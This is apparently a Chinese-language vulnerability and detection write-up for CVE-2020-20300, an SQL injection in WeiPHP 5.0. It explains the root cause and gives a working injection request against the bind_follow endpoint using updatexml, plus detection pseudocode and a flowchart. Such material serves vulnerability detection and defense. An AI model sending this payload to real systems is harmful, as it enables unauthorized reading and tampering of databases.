# WeiPHP 5.0 SQL 注入漏洞（CVE-2020-20300）

## 漏洞简介
WeiPHP 5.0 存在 SQL 注入漏洞，攻击者可通过对 `wp_where` 函数的恶意利用，构造特定请求执行任意 SQL 语句，进而获取敏感信息、篡改数据，甚至实现未授权的管理操作。

## 影响范围
- 受影响产品：WeiPHP 5.0
- CPE: `cpe:2.3:a:weiphp:weiphp:5.0:*:*:*:*:*:*:*`

## 漏洞原理
漏洞源于后端对用户输入未做有效过滤，`wp_where` 函数在处理参数时直接拼接到 SQL 语句，导致攻击者可注入恶意 SQL 片段。

## 利用方式与攻击流程
1. 攻击者向目标站点特定接口发送精心构造的 POST 请求，利用 `uid` 参数注入 SQL 语句。
2. 通过 `updatexml` 函数等手法，回显注入结果（如 MD5 哈希值），以确认漏洞存在。
3. 若验证成功，攻击者可进一步利用漏洞进行数据窃取、篡改等操作。

## 探测原理与流程
### 请求包示例
```http
POST /public/index.php/home/index/bind_follow/?publicid=1&is_ajax=1&uid[0]=exp&uid[1]=) and updatexml(1,concat(0x7e,md5('999999'),0x7e),1)--+ HTTP/1.1
Host: target.com
Content-Length: 0
```

### 响应示例
```http
HTTP/1.1 500 Internal Server Error
...
52c69e3a57331081823331c4e69d3f2
```

### 判定逻辑
- 响应状态码为 500。
- 响应体中包含 `52c69e3a57331081823331c4e69d3f2`（即 `md5('999999')` 的值）。

### 伪代码
```python
send_post(
    url="/public/index.php/home/index/bind_follow/?publicid=1&is_ajax=1&uid[0]=exp&uid[1]=) and updatexml(1,concat(0x7e,md5('999999'),0x7e),1)--+",
    data=""
)
if response.status_code == 500 and "52c69e3a57331081823331c4e69d3f2" in response.text:
    print("存在 SQL 注入漏洞")
```

### Mermaid 流程图
```mermaid
flowchart TD
    A[开始] --> B[构造注入请求]
    B --> C[发送 POST 请求]
    C --> D{响应状态码是否为 500?}
    D -- 否 --> E[不存在漏洞]
    D -- 是 --> F{响应体是否包含 md5('999999')?}
    F -- 否 --> E
    F -- 是 --> G[存在 SQL 注入漏洞]
```

## 参考链接
- [WeiPHP SQL 注入分析与利用](https://github.com/Y4er/Y4er.com/blob/15f49973707f9d526a059470a074cb6e38a0e1ba/content/post/weiphp-exp-sql.md)
- [NVD 官方漏洞库](https://nvd.nist.gov/vuln/detail/CVE-2020-20300)
- [ARPSyndicate cvemon](https://github.com/ARPSyndicate/cvemon)
- [ARPSyndicate kenzer-templates](https://github.com/ARPSyndicate/kenzer-templates) 